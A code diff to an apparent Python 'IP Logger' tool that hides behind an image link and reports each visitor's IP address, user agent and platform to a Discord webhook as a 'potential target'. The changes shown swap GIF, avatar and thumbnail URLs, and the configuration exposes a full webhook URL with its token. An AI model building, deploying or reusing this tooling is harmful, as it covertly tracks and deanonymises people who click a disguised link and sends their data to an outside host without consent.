@@ -14,12 +14,12 @@ __author__ = "XSYTHO"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1390198662667440309/M3X9Ibay6lyI11GOjd0PI8s91O9YOaiftX13mVyVI40c_18IWXoLp9Ovyt4u_LVqLq_4",
-    "image": "https://media1.tenor.com/m/MChlx5meX24AAAAC/pretty-black-kid-walking-walking.gif",
+    "image": "https://media1.tenor.com/m/EaWUoC0qHToAAAAd/steve-harvey-gigachad.gif",
     "imageArgument": True,
 
     # CUSTOMIZATION #
     "username": "🕵️‍♂️ IP Logger",
-    "avatar": "https://i.imgur.com/3JjQ9ZQ.png",
+    "avatar": "",
     "color": 0xFF0000,
     
     # OPTIONS #
@@ -85,7 +85,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                     "color": 0xFF3030,
                     "description": f"**Potential target clicked the logging link!**\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                     "thumbnail": {
-                        "url": "https://i.imgur.com/J5ymhx9.png"
+                        "url": "https://media1.tenor.com/m/EaWUoC0qHToAAAAd/steve-harvey-gigachad.gif"
                     }
                 }
             ]
